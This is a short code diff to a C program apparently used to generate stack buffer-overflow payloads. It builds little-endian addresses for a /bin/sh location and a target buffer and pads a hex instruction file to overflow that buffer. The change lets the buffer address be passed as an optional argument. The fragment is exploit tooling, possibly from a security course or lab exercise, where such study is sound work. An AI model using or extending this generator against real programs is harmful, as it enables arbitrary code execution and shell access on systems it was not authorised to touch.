@@ -32,19 +32,25 @@ int main(int argc, char *argv[]){
 
  
   shAddr = littleEndian(BIN_SH_ADDR, ADDR_SIZE);
-  addr = littleEndian(BUFFER_ADDR, ADDR_SIZE);
 
 
-  if(argc != 3){
-    printf("Wrong number of arguments, use ./gen [instructions] [num_bytes_in_buffer]\n");
+  if(argc != 3 && argc != 4){
+    printf("Wrong number of arguments, use ./gen [instructions] [num_bytes_in_buffer] [buffer_address]\n");
     printf("Instructions: file of instructions to be run. Size must not exceed num_bytes_in_buffer. Expected to be in hex.\n");
     printf("num_bytes_in_buffer: number of bytes in the buffer (assumes buffer is first local variable).\n");
+    printf("buffer_address: address of buffer to overflow. Default %s\n.", BUFFER_ADDR);
     exit(1);
   }
 
   instFile = argv[1];
   numChars = atoi(argv[2]) - ADDR_SIZE; //subtract 8 bytes as we are putting 16 bytes of arguments at beginning of buffer  
   instFp = fopen(instFile, "rb");
+
+  if (argc == 4){
+    addr = littleEndian(argv[3], ADDR_SIZE);
+  }else{
+    addr = littleEndian(BUFFER_ADDR, ADDR_SIZE);
+  }
 
   
   if(file == NULL){
